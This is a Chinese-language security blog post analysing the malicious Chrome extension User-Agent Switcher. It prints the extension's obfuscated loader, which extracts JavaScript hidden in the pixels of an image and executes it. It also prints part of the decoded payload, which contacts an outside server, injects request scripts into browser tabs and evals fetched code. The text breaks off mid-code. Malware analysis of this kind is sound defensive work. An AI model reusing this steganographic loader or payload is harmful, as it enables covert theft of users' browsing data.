<!DOCTYPE html><html lang="zh-CN"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="Vulnerability|Security|Binary"><title>Chrome恶意插件User-Agent Switcher分析 | WeaponX's Blog</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/7.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.2.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">Chrome恶意插件User-Agent Switcher分析</h1><a id="logo" href="/.">WeaponX's Blog</a><p class="description">Binary</p></div><div id="nav-menu"><a href="/." class="current"><i class="fa fa-home"> 首页</i></a><a href="/archives/"><i class="fa fa-archive"> 归档</i></a><a href="/about/"><i class="fa fa-user"> 关于</i></a><a href="/atom.xml"><i class="fa fa-rss"> 订阅</i></a></div></div><div id="layout" class="pure-g"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">Chrome恶意插件User-Agent Switcher分析</h1><div class="post-meta">Oct 15, 2017<span> | </span><span class="category"><a href="/categories/安全/">安全</a></span></div><div class="post-content"><p>之前写的，放出来-。-</p>
<h2 id="插件背景"><a href="#插件背景" class="headerlink" title="插件背景"></a>插件背景</h2><p>User-Agent Swither 是一款Chrome插件，用户切换访问web时候的User-Agent的，这个插件有51万条安装量。大部分都是前端工作人员或者安全研究人员使用，需要频繁切换User-Agent。</p>
<p>然而，在v2ex上有人发了这么一篇文章<code>https://www.v2ex.com/t/389340?from=timeline</code></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>通常，chrome插件的物理地址<code>C:\Users\admin\AppData\Local\Google\Chrome\User Data\Default\Extensions\ffhkkpnppgnfaobgihpdblnhmmbodake</code></p>
<p>打开<code>background.js</code>，看这个js文件的第80行</p>
<p><img src="1.png" alt=""></p>
<p>格式化后</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line"><span class="keyword">var</span> promo = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">    <span class="keyword">try</span> &#123;</div><div class="line">        <span class="keyword">var</span> t = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;&#125;,</div><div class="line">        r = &#123;</div><div class="line">            <span class="attr">Ae</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">if</span> (<span class="built_in">isNaN</span>(t) || !<span class="built_in">isFinite</span>(t) || t % <span class="number">1</span> || t &lt; <span class="number">2</span>) <span class="keyword">return</span> ! <span class="number">1</span>;</div><div class="line">                <span class="keyword">if</span> (t % <span class="number">2</span> === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">2</span> === t;</div><div class="line">                <span class="keyword">if</span> (t % <span class="number">3</span> === <span class="number">0</span>) <span class="keyword">return</span> <span class="number">3</span> === t;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="built_in">Math</span>.sqrt(t), e = <span class="number">5</span>; e &lt;= r; e += <span class="number">6</span>) &#123;</div><div class="line">                    <span class="keyword">if</span> (t % e === <span class="number">0</span>) <span class="keyword">return</span> ! <span class="number">1</span>;</div><div class="line">                    <span class="keyword">if</span> (t % (e + <span class="number">2</span>) === <span class="number">0</span>) <span class="keyword">return</span> ! <span class="number">1</span></div><div class="line">                &#125;</div><div class="line">                <span class="keyword">return</span> ! <span class="number">0</span></div><div class="line">            &#125;,</div><div class="line">            <span class="attr">Hf</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> r = <span class="string">""</span>,</div><div class="line">                e = <span class="number">-670</span>,</div><div class="line">                n = <span class="number">0</span>,</div><div class="line">                i = <span class="number">0</span>; i &lt; t.length; i++) n = t[i].charCodeAt() + e,</div><div class="line">                r += <span class="built_in">String</span>.fromCharCode(n);</div><div class="line">                <span class="keyword">return</span> r</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">Yb</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> e = t; ! <span class="number">0</span>; e += <span class="number">1</span>) <span class="keyword">if</span> (r.Ae(e)) <span class="keyword">return</span> e</div><div class="line">            &#125;,</div><div class="line">            <span class="attr">Wk</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">var</span> r = <span class="keyword">new</span> Image;</div><div class="line">                <span class="keyword">for</span> (r.src = t; r.hasOwnProperty(<span class="string">"complete"</span>) &amp;&amp; !r.complete;);</div><div class="line">                <span class="keyword">return</span> r</div><div class="line">            &#125;</div><div class="line">        &#125;;</div><div class="line">        <span class="keyword">return</span> t.prototype.ET = &#123;</div><div class="line">            <span class="attr">mp</span>: <span class="number">3</span>,</div><div class="line">            <span class="attr">Tv</span>: <span class="number">1</span>,</div><div class="line">            <span class="attr">At</span>: <span class="number">16</span>,</div><div class="line">            <span class="attr">WC</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> t + <span class="number">1</span></div><div class="line">            &#125;,</div><div class="line">            <span class="attr">TY</span>: <span class="function"><span class="keyword">function</span>(<span class="params">t, r, e</span>) </span>&#123;</div><div class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> n = !<span class="number">0</span>,</div><div class="line">                i = <span class="number">0</span>; i &lt; <span class="number">16</span> &amp;&amp; n; i += <span class="number">1</span>) n = n &amp;&amp; <span class="number">255</span> === t[r + <span class="number">4</span> * i];</div><div class="line">                <span class="keyword">return</span> n</div><div class="line">            &#125;</div><div class="line">        &#125;,</div><div class="line">        t.prototype.aq = <span class="function"><span class="keyword">function</span>(<span class="params">t, r</span>) </span>&#123;</div><div class="line">            r = r || &#123;&#125;;</div><div class="line">            <span class="keyword">var</span> e = <span class="keyword">this</span>.ET,</div><div class="line">            n = r.width || t.width,</div><div class="line">            i = r.height || t.height,</div><div class="line">            o = r.mp || e.mp,</div><div class="line">            h = r.At || e.At;</div><div class="line">            <span class="keyword">return</span> o * n * i / h &gt;&gt; <span class="number">0</span></div><div class="line">        &#125;,</div><div class="line">        t.prototype.Vh = <span class="function"><span class="keyword">function</span>(<span class="params">t, e</span>) </span>&#123;</div><div class="line">            <span class="keyword">if</span> (<span class="string">""</span> === <span class="string">'../promo.jpg'</span>) <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">            <span class="keyword">void</span> <span class="number">0</span> === t &amp;&amp; (t = <span class="string">'../promo.jpg'</span>),</div><div class="line">            t.length &amp;&amp; (t = r.Wk(t)),</div><div class="line">            e = e || &#123;&#125;;</div><div class="line">            <span class="keyword">var</span> n = <span class="keyword">this</span>.ET,</div><div class="line">            i = e.mp || n.mp,</div><div class="line">            o = e.Tv || n.Tv,</div><div class="line">            h = e.At || n.At,</div><div class="line">            a = r.Yb(<span class="built_in">Math</span>.pow(<span class="number">2</span>, i)),</div><div class="line">            f = (e.WC || n.WC, e.TY || n.TY),</div><div class="line">            u = <span class="built_in">document</span>.createElement(<span class="string">"canvas"</span>),</div><div class="line">            p = u.getContext(<span class="string">"2d"</span>);</div><div class="line">            <span class="keyword">if</span> (u.style.display = <span class="string">"none"</span>, u.width = e.width || t.width, u.height = e.width || t.height, <span class="number">0</span> === u.width || <span class="number">0</span> === u.height) <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">            e.height &amp;&amp; e.width ? p.drawImage(t, <span class="number">0</span>, <span class="number">0</span>, e.width, e.height) : p.drawImage(t, <span class="number">0</span>, <span class="number">0</span>);</div><div class="line">            <span class="keyword">var</span> c = p.getImageData(<span class="number">0</span>, <span class="number">0</span>, u.width, u.height),</div><div class="line">            d = c.data,</div><div class="line">            g = [];</div><div class="line">            <span class="keyword">if</span> (c.data.every(<span class="function"><span class="keyword">function</span>(<span class="params">t</span>) </span>&#123;</div><div class="line">                <span class="keyword">return</span> <span class="number">0</span> === t</div><div class="line">            &#125;)) <span class="keyword">return</span> <span class="string">""</span>;</div><div class="line">            <span class="keyword">var</span> m, s;</div><div class="line">            <span class="keyword">if</span> (<span class="number">1</span> === o) <span class="keyword">for</span> (m = <span class="number">3</span>, s = !<span class="number">1</span>; ! s &amp;&amp; m &lt; d.length &amp;&amp; !s; m += <span class="number">4</span>) s = f(d, m, o),</div><div class="line">            s || g.push(d[m] - (<span class="number">255</span> - a + <span class="number">1</span>));</div><div class="line">            <span class="keyword">var</span> v = <span class="string">""</span>,</div><div class="line">            w = <span class="number">0</span>,</div><div class="line">            y = <span class="number">0</span>,</div><div class="line">            l = <span class="built_in">Math</span>.pow(<span class="number">2</span>, h) - <span class="number">1</span>;</div><div class="line">            <span class="keyword">for</span> (m = <span class="number">0</span>; m &lt; g.length; m += <span class="number">1</span>) w += g[m] &lt;&lt; y,</div><div class="line">            y += i,</div><div class="line">            y &gt;= h &amp;&amp; (v += <span class="built_in">String</span>.fromCharCode(w &amp; l), y %= h, w = g[m] &gt;&gt; i - y);</div><div class="line">            <span class="keyword">return</span> v.length &lt; <span class="number">13</span> ? <span class="string">""</span>: (<span class="number">0</span> !== w &amp;&amp; (v += <span class="built_in">String</span>.fromCharCode(w &amp; l)), v)</div><div class="line">        &#125;,</div><div class="line">        t.prototype.Po = <span class="number">3</span>,</div><div class="line">        t.prototype.cs = <span class="number">0</span>,</div><div class="line">        t.prototype.Rn = <span class="number">5e3</span>,</div><div class="line">        t.prototype.dS = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">            <span class="keyword">try</span> &#123;</div><div class="line">                <span class="keyword">var</span> e = t.prototype,</div><div class="line">                n = r.Hf(e.Vh());</div><div class="line">                <span class="keyword">if</span> (<span class="string">""</span> === n) &#123;</div><div class="line">                    <span class="keyword">if</span> (e.cs &gt; e.Po) <span class="keyword">return</span>;</div><div class="line">                    <span class="keyword">return</span> e.cs++,</div><div class="line">                    <span class="keyword">void</span> setTimeout(e.dS, e.Rn)</div><div class="line">                &#125;</div><div class="line">                <span class="built_in">document</span>.defaultView[(<span class="keyword">typeof</span> r.Ae).charAt(<span class="number">0</span>).toUpperCase() + (<span class="keyword">typeof</span> r.Ae).slice(<span class="number">1</span>)](n)()</div><div class="line">            &#125; <span class="keyword">catch</span>(t) &#123;&#125;</div><div class="line">        &#125;,</div><div class="line">        (<span class="keyword">new</span> t).dS</div><div class="line">    &#125; <span class="keyword">catch</span>(t) &#123;&#125;</div><div class="line">&#125; ();</div><div class="line">promo();</div></pre></td></tr></table></figure>
<p>可以看出，这段js从<code>promo.jpg</code>图片中取数据。下图为这段js代码解析出来的后门js代码。</p>
<p><img src="2.png" alt=""></p>
<p>跳转到从图片中解析出来的javascript代码</p>
<p><img src="3.png" alt=""></p>
<p>代码抠出来是这样的</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</div><div class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> _0x2126=[<span class="string">'\x63\x6f\x64\x65'</span>,<span class="string">'\x76\x65\x72\x73\x69\x6f\x6e'</span>,<span class="string">'\x65\x72\x72\x6f\x72'</span>,<span class="string">'\x64\x6f\x77\x6e\x6c\x6f\x61\x64'</span>,<span class="string">'\x69\x6e\x76\x61\x6c\x69\x64\x4d\x6f\x6e\x65\x74\x69\x7a\x61\x74\x69\x6f\x6e\x43\x6f\x64\x65'</span>,<span class="string">'\x54\x6a\x50\x7a\x6c\x38\x63\x61\x49\x34\x31'</span>,<span class="string">'\x4b\x49\x31\x30\x77\x54\x77\x77\x76\x46\x37'</span>,<span class="string">'\x46\x75\x6e\x63\x74\x69\x6f\x6e'</span>,<span class="string">'\x72\x75\x6e'</span>,<span class="string">'\x69\x64\x6c\x65'</span>,<span class="string">'\x70\x79\x57\x35\x46\x31\x55\x34\x33\x56\x49'</span>,<span class="string">'\x69\x6e\x69\x74'</span>,<span class="string">'\x68\x74\x74\x70\x73\x3a\x2f\x2f\x74\x68\x65\x2d\x65\x78\x74\x65\x6e\x73\x69\x6f\x6e\x2e\x63\x6f\x6d'</span>,<span class="string">'\x6c\x6f\x63\x61\x6c'</span>,<span class="string">'\x73\x74\x6f\x72\x61\x67\x65'</span>,<span class="string">'\x65\x76\x61\x6c'</span>,<span class="string">'\x74\x68\x65\x6e'</span>,<span class="string">'\x67\x65\x74'</span>,<span class="string">'\x67\x65\x74\x54\x69\x6d\x65'</span>,<span class="string">'\x73\x65\x74\x55\x54\x43\x48\x6f\x75\x72\x73'</span>,<span class="string">'\x75\x72\x6c'</span>,<span class="string">'\x6f\x72\x69\x67\x69\x6e'</span>,<span class="string">'\x73\x65\x74'</span>,<span class="string">'\x47\x45\x54'</span>,<span class="string">'\x6c\x6f\x61\x64\x69\x6e\x67'</span>,<span class="string">'\x73\x74\x61\x74\x75\x73'</span>,<span class="string">'\x72\x65\x6d\x6f\x76\x65\x4c\x69\x73\x74\x65\x6e\x65\x72'</span>,<span class="string">'\x6f\x6e\x55\x70\x64\x61\x74\x65\x64'</span>,<span class="string">'\x74\x61\x62\x73'</span>,<span class="string">'\x63\x61\x6c\x6c\x65\x65'</span>,<span class="string">'\x61\x64\x64\x4c\x69\x73\x74\x65\x6e\x65\x72'</span>,<span class="string">'\x6f\x6e\x4d\x65\x73\x73\x61\x67\x65'</span>,<span class="string">'\x72\x75\x6e\x74\x69\x6d\x65'</span>,<span class="string">'\x65\x78\x65\x63\x75\x74\x65\x53\x63\x72\x69\x70\x74'</span>,<span class="string">'\x72\x65\x70\x6c\x61\x63\x65'</span>,<span class="string">'\x64\x61\x74\x61'</span>,<span class="string">'\x74\x65\x73\x74'</span>,<span class="string">'\x69\x6e\x63\x6c\x75\x64\x65\x73'</span>,<span class="string">'\x68\x74\x74\x70\x3a\x2f\x2f'</span>,<span class="string">'\x6c\x65\x6e\x67\x74\x68'</span>,<span class="string">'\x55\x72\x6c\x20\x65\x72\x72\x6f\x72'</span>,<span class="string">'\x71\x75\x65\x72\x79'</span>,<span class="string">'\x66\x69\x6c\x74\x65\x72'</span>,<span class="string">'\x61\x63\x74\x69\x76\x65'</span>,<span class="string">'\x66\x6c\x6f\x6f\x72'</span>,<span class="string">'\x72\x61\x6e\x64\x6f\x6d'</span>,<span class="string">'\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'</span>,<span class="string">'\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'</span>,<span class="string">'\x70\x61\x72\x73\x65'</span>];<span class="function">(<span class="params"><span class="keyword">function</span>(_0x6f8364,_0x4b9bae</span>)&#123;<span class="params">var</span> <span class="params">_0x3c53a7</span>=<span class="params">function</span>(<span class="params">_0x221aea</span>)&#123;<span class="params">while</span>(<span class="params">--_0x221aea</span>)&#123;<span class="params">_0x6f8364</span>['\<span class="params">x70</span>\<span class="params">x75</span>\<span class="params">x73</span>\<span class="params">x68</span>'](<span class="params">_0x6f8364[<span class="string">'\x73\x68\x69\x66\x74'</span>](</span>));&#125;&#125;;<span class="params">_0x3c53a7</span>(<span class="params">++_0x4b9bae</span>);&#125;(<span class="params">_0x2126,<span class="number">0xa2</span></span>));<span class="params">var</span> <span class="params">_0x1838</span>=<span class="params">function</span>(<span class="params">_0x63fdaa,_0x4b2cbf</span>)&#123;<span class="params">var</span> <span class="params">_0x63fdaa</span>=<span class="params">parseInt</span>(<span class="params">_0x63fdaa,<span class="number">0x10</span></span>);<span class="params">var</span> <span class="params">_0x5570e3</span>=<span class="params">_0x2126</span>[<span class="params">_0x63fdaa</span>];<span class="params">return</span> <span class="params">_0x5570e3</span>;&#125;;<span class="params">function</span> <span class="params">e</span>(<span class="params">&#123;cat=_0x1838(<span class="string">'0x0'</span></span>),<span class="params">act</span>='',<span class="params">lab</span>='',<span class="params">fr</span>=0<span class="params">x3e8</span>*0<span class="params">x3c</span>*0<span class="params">x3c</span>*0<span class="params">x18</span>&#125;)&#123;<span class="params">let</span> <span class="params">_0x4b1721</span>=<span class="params">t</span>(<span class="params"><span class="string">`<span class="subst">$&#123;cat&#125;</span>_<span class="subst">$&#123;act&#125;</span>`</span>,c[<span class="string">'\x46\x44'</span>]</span>);<span class="params">return</span> <span class="params">l</span>['\<span class="params">x67</span>\<span class="params">x65</span>\<span class="params">x74</span>'](<span class="params">_0x4b1721</span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x1'</span></span>)](<span class="params">_0x9415ed=&gt;&#123;<span class="keyword">let</span> _0x5d937f=_0x9415ed[_0x4b1721],_0x45c15f=<span class="number">0x5265c00</span>==fr?<span class="keyword">new</span> <span class="built_in">Date</span>(</span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x3'</span></span>)]<span class="params">()</span>-<span class="params">new</span> <span class="params">Date</span>(<span class="params">_0x5d937f</span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x4'</span></span>)](<span class="params"><span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span>,<span class="number">0x0</span></span>)&gt;=<span class="params">fr</span>:<span class="params">new</span> <span class="params">Date</span><span class="params">()</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x3'</span></span>)]<span class="params">()</span>-<span class="params">_0x5d937f</span>&gt;=<span class="params">fr</span>;<span class="params">if</span>(<span class="params">!_0x5d937f||_0x45c15f</span>)&#123;<span class="params">let</span> <span class="params">_0x9415ed</span>=`<span class="params">$</span>&#123;<span class="params">new</span> <span class="params">URL</span>(<span class="params">c[<span class="string">'\x57\x4c'</span>][_0x1838(<span class="string">'0x5'</span></span>)])[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x6'</span></span>)]&#125;/<span class="params">stats</span>`;<span class="params">n</span>(<span class="params"><span class="string">`<span class="subst">$&#123;_0x9415ed&#125;</span>?hash=jwtmv6kavksy5cazdf4leg66r&amp;eventCategory=<span class="subst">$&#123;cat&#125;</span>&amp;eventAction=<span class="subst">$&#123;act&#125;</span>&amp;eventLabel=<span class="subst">$&#123;lab&#125;</span>`</span>,<span class="string">'\x50\x4f\x53\x54'</span></span>)['\<span class="params">x74</span>\<span class="params">x68</span>\<span class="params">x65</span>\<span class="params">x6e</span>'](<span class="params">_0x201de8=&gt;&#123;<span class="keyword">let</span> _0x9415ed=&#123;&#125;;_0x9415ed[_0x4b1721]=<span class="keyword">new</span> <span class="built_in">Date</span>(</span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x3'</span></span>)]<span class="params">()</span>,<span class="params">l</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x7'</span></span>)](<span class="params">_0x9415ed</span>);&#125;);&#125;&#125;);&#125;<span class="params">function</span> <span class="params">n</span>(<span class="params">_0x42ba8f,n=_0x1838(<span class="string">'0x8'</span></span>))&#123;<span class="params">return</span> <span class="params">new</span> <span class="params">Promise</span>(<span class="params">(_0x3090bd,_0x473358</span>)=&gt;</span>&#123;<span class="function"><span class="keyword">function</span> <span class="title">_0x3ad6d4</span>(<span class="params">_0x3a3304,_0x4cce31,_0x57e5fb</span>)</span>&#123;_0x1838(<span class="string">'0x9'</span>)===_0x4cce31[_0x1838(<span class="string">'0xa'</span>)]&amp;&amp;<span class="function">(<span class="params">_0x20f3c8(_0x57e5fb,_0x42ba8f</span>)&amp;&amp;<span class="params">c</span>['\<span class="params">x4e</span>\<span class="params">x5a</span>']&lt;=0<span class="params">x0</span>&amp;&amp;(<span class="params">chrome[_0x1838(<span class="string">'0xd'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xc'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xb'</span></span>)](<span class="params"><span class="built_in">arguments</span>[_0x1838(<span class="string">'0xe'</span></span>)]),<span class="params">_0x2bc9ef</span>(<span class="params">_0x3a3304</span>)),<span class="params">c</span>['\<span class="params">x4e</span>\<span class="params">x5a</span>']--);&#125;<span class="params">function</span> <span class="params">_0x2bc9ef</span>(<span class="params">_0x5a3411</span>)&#123;<span class="params">chrome</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x11'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x10'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xf'</span></span>)](<span class="params">_0x4b297c</span>),<span class="params">chrome</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xd'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x12'</span></span>)](<span class="params">_0x5a3411,&#123;<span class="string">'\x63\x6f\x64\x65'</span>:<span class="string">`(function()&#123;var url = replaceableurl; var xhr = new XMLHttpRequest();xhr.onreadystatechange = function () &#123;if (xhr.readyState === 4) &#123;chrome.runtime.sendMessage(&#123;data: xhr.responseText, url: url,status:xhr.status&#125;);&#125;&#125;;xhr.open('<span class="subst">$&#123;n&#125;</span>',url, true);xhr.send();&#125;)()`</span>[_0x1838(<span class="string">'0x13'</span></span>)](<span class="params"><span class="string">'\x72\x65\x70\x6c\x61\x63\x65\x61\x62\x6c\x65\x75\x72\x6c'</span>,<span class="string">`'<span class="subst">$&#123;_0x42ba8f&#125;</span>'`</span></span>)&#125;);&#125;<span class="params">function</span> <span class="params">_0x4b297c</span>(<span class="params">_0x4a051f</span>)&#123;<span class="params">_0x4a051f</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x5'</span></span>)]===<span class="params">_0x42ba8f</span>&amp;&amp;(<span class="params">_0x3090bd(_0x4a051f[_0x1838(<span class="string">'0x14'</span></span>)]),<span class="params">chrome</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x11'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x10'</span></span>)]['\<span class="params">x72</span>\<span class="params">x65</span>\<span class="params">x6d</span>\<span class="params">x6f</span>\<span class="params">x76</span>\<span class="params">x65</span>\<span class="params">x4c</span>\<span class="params">x69</span>\<span class="params">x73</span>\<span class="params">x74</span>\<span class="params">x65</span>\<span class="params">x6e</span>\<span class="params">x65</span>\<span class="params">x72</span>'](<span class="params"><span class="built_in">arguments</span>[_0x1838(<span class="string">'0xe'</span></span>)]));&#125;<span class="params">function</span> <span class="params">_0x20f3c8</span>(<span class="params">_0x45a021,_0x3db6fb</span>)&#123;<span class="params">return</span> <span class="params">new</span> <span class="params">RegExp</span>(<span class="params"><span class="string">`^((?!(chrome<span class="subst">$&#123;_0x3db6fb[_0x1838(<span class="string">'0x16'</span>)](_0x1838(<span class="string">'0x17'</span>))?<span class="string">'\x7c\x68\x74\x74\x70\x73\x7c\x66\x74\x70\x73'</span>:<span class="string">''</span>&#125;</span>)).+://)`</span></span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x15'</span></span>)](<span class="params">_0x45a021[_0x1838(<span class="string">'0x5'</span></span>)]);&#125;<span class="params">_0x42ba8f</span>&amp;&amp;0<span class="params">x0</span>!==<span class="params">_0x42ba8f</span>['\<span class="params">x6c</span>\<span class="params">x65</span>\<span class="params">x6e</span>\<span class="params">x67</span>\<span class="params">x74</span>\<span class="params">x68</span>']||<span class="params">_0x473358</span>(<span class="params">_0x1838(<span class="string">'0x19'</span></span>)),<span class="params">chrome</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xd'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x1a'</span></span>)](<span class="params">&#123;&#125;,<span class="keyword">function</span>(_0x26d445</span>)&#123;<span class="params">let</span> <span class="params">_0x3090bd</span>=<span class="params">_0x26d445</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x1b'</span></span>)](<span class="params">_0x1c9951=&gt;_0x20f3c8(_0x1c9951,_0x42ba8f</span>)&amp;&amp;!<span class="params">_0x1c9951</span>['\<span class="params">x61</span>\<span class="params">x63</span>\<span class="params">x74</span>\<span class="params">x69</span>\<span class="params">x76</span>\<span class="params">x65</span>']);0<span class="params">x0</span>===<span class="params">_0x3090bd</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x18'</span></span>)]?<span class="params">chrome</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xd'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xc'</span></span>)][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0xf'</span></span>)](<span class="params">_0x3ad6d4</span>):<span class="params">_0x2bc9ef</span>(<span class="params">_0x3090bd[<span class="built_in">Math</span>[_0x1838(<span class="string">'0x1d'</span></span>)](<span class="params"><span class="built_in">Math</span>[<span class="string">'\x72\x61\x6e\x64\x6f\x6d'</span>](</span>)*<span class="params">_0x3090bd</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x18'</span></span>)])]['\<span class="params">x69</span>\<span class="params">x64</span>']);&#125;);&#125;);&#125;<span class="params">function</span> <span class="params">t</span>(<span class="params">_0x474bb1,_0x4cc1c1</span>)&#123;<span class="params">for</span>(<span class="params"><span class="keyword">var</span> _0x36e242=<span class="string">''</span>,_0x35971b=<span class="number">0x0</span>,_0x519d9f=<span class="number">0x0</span>;_0x519d9f&lt;_0x474bb1[<span class="string">'\x6c\x65\x6e\x67\x74\x68'</span>];_0x519d9f++</span>)<span class="params">_0x35971b</span>=<span class="params">_0x474bb1</span>[<span class="params">_0x519d9f</span>][<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x1f'</span></span>)]<span class="params">()</span>+<span class="params">_0x4cc1c1</span>,<span class="params">_0x36e242</span>+=<span class="params">String</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x20'</span></span>)](<span class="params">_0x35971b</span>);<span class="params">return</span> <span class="params">_0x36e242</span>;&#125;<span class="params">function</span> <span class="params">o</span>(<span class="params">_0xcaa92b</span>)&#123;<span class="params">return</span> <span class="params">new</span> <span class="params">Promise</span>(<span class="params">(_0x47fce0,_0x349364</span>)=&gt;</span>&#123;<span class="keyword">let</span> _0x51ae9e=!<span class="number">0x1</span>,_0x556fe3=<span class="string">''</span>,_0x58bf0d=<span class="string">''</span>;<span class="keyword">try</span>&#123;_0xcaa92b=<span class="built_in">JSON</span>[_0x1838(<span class="string">'0x21'</span>)](_0xcaa92b),_0x556fe3=_0xcaa92b[_0x1838(<span class="string">'0x22'</span>)],_0x58bf0d=_0xcaa92b[_0x1838(<span class="string">'0x23'</span>)],_0x556fe3==<span class="number">-0x1</span>||<span class="function">(<span class="params">_0x51ae9e=!<span class="number">0x0</span></span>);&#125;<span class="params">catch</span>(<span class="params">_0x1b0f96</span>)&#123;<span class="params">e</span>(<span class="params">&#123;<span class="string">'\x61\x63\x74'</span>:_0x1838(<span class="string">'0x24'</span></span>),'\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':'\<span class="params">x70</span>\<span class="params">x61</span>\<span class="params">x72</span>\<span class="params">x73</span>\<span class="params">x65</span>\<span class="params">x52</span>\<span class="params">x65</span>\<span class="params">x73</span>\<span class="params">x70</span>\<span class="params">x6f</span>\<span class="params">x6e</span>\<span class="params">x73</span>\<span class="params">x65</span>','\<span class="params">x66</span>\<span class="params">x72</span>':0<span class="params">x0</span>&#125;);&#125;<span class="params">_0x51ae9e</span>?<span class="params">l</span>[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x7'</span></span>)](<span class="params">&#123;<span class="string">'\x54\x6a\x50\x7a\x6c\x38\x63\x61\x49\x34\x31'</span>:_0x556fe3,<span class="string">'\x4b\x49\x31\x30\x77\x54\x77\x77\x76\x46\x37'</span>:_0x58bf0d&#125;</span>)['\<span class="params">x74</span>\<span class="params">x68</span>\<span class="params">x65</span>\<span class="params">x6e</span>'](<span class="params">_0x207847=&gt;&#123;l[<span class="string">'\x73\x65\x74'</span>](&#123;<span class="string">'\x70\x79\x57\x35\x46\x31\x55\x34\x33\x56\x49'</span>:<span class="keyword">new</span> <span class="built_in">Date</span>(</span>)[<span class="params">_0x1838</span>(<span class="params"><span class="string">'0x3'</span></span>)]<span class="params">()</span>&#125;),<span class="params">e</span>(<span class="params">&#123;<span class="string">'\x61\x63\x74'</span>:_0x1838(<span class="string">'0x25'</span></span>),'\<span class="params">x6c</span>\<span class="params">x61</span>\<span class="params">x62</span>':<span class="params">_0x58bf0d</span>,'\<span class="params">x66</span>\<span class="params">x72</span>':0<span class="params">x0</span>&#125;),<span class="params">_0x47fce0</span>(<span class="params">&#123;<span class="string">'\x63\x6f\x64\x65'</span>:_0x556fe3,<span class="string">'\x76\x65\x72\x73\x69\x6f\x6e'</span>:_0x58bf0d&#125;</span>);&#125;):(<span class="params">_0x556fe3!=<span class="number">-0x1</span>&amp;&amp;e(&#123;<span class="string">'\x61\x63\x74'</span>:_0x1838(<span class="string">'0x24'</span></span>),'\<span 